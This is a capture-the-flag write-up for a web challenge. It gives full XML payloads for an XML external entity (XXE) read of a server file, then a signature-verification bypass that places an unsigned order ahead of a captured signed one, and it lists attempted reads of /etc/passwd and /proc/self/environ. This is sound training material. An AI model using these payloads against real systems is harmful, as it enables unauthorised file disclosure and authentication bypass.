# Operation Dawn: The Command Seal

**Author:** mar

**Web** · 270 pts

**TL;DR.** `POST /report` logs the parsed `<summary>` element, so an XXE entity reads the relay's
own outbox and hands back a complete command-signed order (`cmd-6002`) with its digest and RSA
signature. `POST /order` verifies the digest against the **last** `<order>` element but acts on the
**first**: put an unsigned `kind=standing` order first and the captured signed order last, and the
relay reads out command's standing order.

## Solve

**Leak the seal.** `POST /report` takes XML and echoes the `<summary>` element after parsing. An
external entity reads the relay's own journal:

```xml
<?xml version="1.0"?>
<!DOCTYPE report [<!ENTITY xxe SYSTEM "file:///opt/relay/outbox/last-order.txt">]>
<report><summary>&xxe;</summary></report>
```

```text
id=cmd-6002
kind=routine
text=hold the canal checkpoint and report at dusk
ref=cmd-6002
digest=3285LDdHeDDsT0GAAYpPfB9xgKcH/obiPxlWg4JzueM=
sig=OE0OLHL+CjK8Vz5awC/TEztPYHvaoDITrHQSw7yN27QBZIwOV1jY60oAhXrgxVK12WfD9QMc/…
```

**Recover the digest formula.** `base64(sha256("id|kind|text"))` reproduces the journal digest
exactly for `cmd-6002|routine|hold the canal checkpoint and report at dusk`. The `sig` is a 256-byte
RSA-2048 blob over that digest. Command's private key stays off the wire, but its seal for this one
order is now in hand.

**Find the verify/act split.** `POST /order` takes a `<relay>` document holding one or more
`<order>` elements plus one `<auth>`. The digest check is evaluated against the **last** order
element; the relay acts on the **first**:

| document shape | response |
| --- | --- |
| one unsigned order (`x-1`) | `digest does not match the signed order` |
| signed `cmd-6002` only | `order acknowledged: hold the canal checkpoint…` |
| signed first, unsigned second | acts on the signed one |
| **unsigned first, signed second** | **acts on the unsigned one** |

**Release the standing order.** Kinds are case-sensitive and unknown kinds just echo the text;
`kind=standing` is the one that makes the relay honour command's standing order:

```xml
<relay>
  <order id="x-1"><kind>standing</kind><text>give it up</text></order>
  <order id="cmd-6002"><kind>routine</kind><text>hold the canal checkpoint and report at dusk</text></order>
  <auth><ref>cmd-6002</ref><digest>3285LDdHeDDsT0GAAYpPfB9xgKcH/obiPxlWg4JzueM=</digest><sig>OE0OLHL+…</sig></auth>
</relay>
```

→ `command standing order honoured: CSCTF{3X4l9Zz36QHJtsf5Cf9zYhSr}`

Dead ends: `kind=STANDING` is acknowledged but releases nothing; `release`/`retrieve`/`disclose`/
`publish`/`read`/`issue`/`recall`/`deliver` only echo; replacing `ref` fails the signature. XXE is
restricted to the journal path — `/etc/passwd`, `/etc/hostname`, `/proc/self/environ` and other
`/opt/relay/*` guesses fail with `order could not be parsed`.

**Flag:** `CSCTF{3X4l9Zz36QHJtsf5Cf9zYhSr}`

**Evidence.** The chain, journal dump and control matrix come from the live-solve workspace
`ctf-ashrelay/WRITEUP.md` and its runners [solve_ashrelay.py](solve_ashrelay.py) and
[xxe.py](xxe.py); the flag is also listed in `ctf-helio/REPORT-FULL.md` (§13). CTFd recorded the
solve at 2026-11-06T16:40:39Z. The captured relay page is in [files/root.html](files/root.html);
the instance is gone, so the signed journal cannot be re-read — the writeup was written from the
live responses at 16:40Z.
